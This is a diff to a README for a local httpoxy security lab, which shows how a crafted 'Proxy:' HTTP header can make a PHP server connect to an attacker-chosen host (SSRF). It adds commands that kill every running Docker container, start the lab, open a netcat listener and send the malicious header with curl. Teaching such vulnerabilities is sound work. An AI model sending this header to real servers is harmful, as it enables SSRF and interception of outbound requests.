@@ -2,10 +2,23 @@
 ## Injection of environment variable via "Proxy:" HTTP Header
 ### Can lead to SSRF
 
-### Run in docker:
+### Clear any existing containers
+```
+docker kill $(docker ps -q)
+```
+
+### Run the lab:
 ```
 cd 1-httpoxy
+docker-compose up -d
 ```
+
+### On another terminal windows run:
+```
+nc -lvp 9999
+curl -H "Proxy: [Your IP]:9999" http://[Your IP]:8080/index.php 
+```
+
 
 ### Explanation
 HTTP Server will interpret Proxy: header value and try to connect to it. This can lead to SSRF.
